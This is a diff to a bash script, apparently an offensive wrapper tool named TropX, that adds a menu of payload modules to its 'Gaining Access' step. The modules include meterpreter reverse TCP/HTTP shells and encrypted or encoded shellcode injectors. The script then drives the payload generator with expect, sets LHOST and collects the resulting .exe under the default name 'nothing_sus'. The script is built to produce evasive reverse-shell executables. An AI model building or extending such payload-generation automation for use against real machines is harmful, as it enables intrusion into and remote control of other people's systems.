@@ -18,6 +18,8 @@ if [[ "$SO" == "1" ]]; then   # Gaining Access
     # get all required inputs
     getInput "Base Name" "Select a base name for output files." "nothing_sus"
     NAME=$SI
+    selectOptions "Payloads" "Select Desired Option" "Select a Valid Option" "autoit/shellcode_inject/flat.py" "auxiliary/coldwar_wrapper.py" "auxiliary/macro_converter.py" "auxiliary/pyinstaller_wrapper.py" "c/meterpreter/rev_http.py" "c/meterpreter/rev_http_service.py" "c/meterpreter/rev_tcp.py" "c/meterpreter/rev_tcp_service.py" "cs/meterpreter/rev_http.py" "cs/meterpreter/rev_https.py" "cs/meterpreter/rev_tcp.py" "cs/shellcode_inject/base64.py" "cs/shellcode_inject/virtual.py" "go/meterpreter/rev_http.py" "go/meterpreter/rev_https.py" "go/meterpreter/rev_tcp.py" "go/shellcode_inject/virtual.py" "lua/shellcode_inject/flat.py" "perl/shellcode_inject/flat." "powershell/meterpreter/rev_http.py" "powershell/meterpreter/rev_https.py" "powershell/meterpreter/rev_tcp.py" "powershell/shellcode_inject/psexec_virtual.py" "powershell/shellcode_inject/virtual.py" "python/meterpreter/bind_tcp.py" "python/meterpreter/rev_http.py" "python/meterpreter/rev_https.py" "python/meterpreter/rev_tcp.py" "python/shellcode_inject/aes_encrypt.py" "python/shellcode_inject/arc_encrypt.py" "python/shellcode_inject/base64_substitution.py" "python/shellcode_inject/des_encrypt.py" "python/shellcode_inject/flat.py" "python/shellcode_inject/letter_substitution.py" "python/shellcode_inject/pidinject.py" "python/shellcode_inject/stallion.py" "ruby/meterpreter/rev_http.py" "ruby/meterpreter/rev_https.py" "ruby/meterpreter/rev_tcp.py" "ruby/shellcode_inject/base64.py" "ruby/shellcode_inject/flat.py"
+    PAYLOAD=$SO
     # getInput "Localhost IP" "Type your LHOST IP" "191.330.165.7"
     # LHOST=$SI
 
@@ -31,7 +33,7 @@ if [[ "$SO" == "1" ]]; then   # Gaining Access
     expect ">: "
     send -- "use 1\r"
     expect ">: "
-    send -- "use 15\r"
+    send -- "use "$PAYLOAD"\r"
     expect "]: "
     send -- "set LHOST '$IP'\r"
     expect "]: "
@@ -53,7 +55,7 @@ if [[ "$SO" == "1" ]]; then   # Gaining Access
     '
     mkdir "output/$NAME/"
     mv "$(find / -name ${NAME}.exe)" "output/$NAME/"
-    mv "$(find / -name ${NAME}.rc)" "output/$NAME/"
+    # mv "$(find / -name ${NAME}.*)" "output/$NAME/"
     message "Success" "You can find all files in under \"TropX/output/$NAME\""
   fi
     
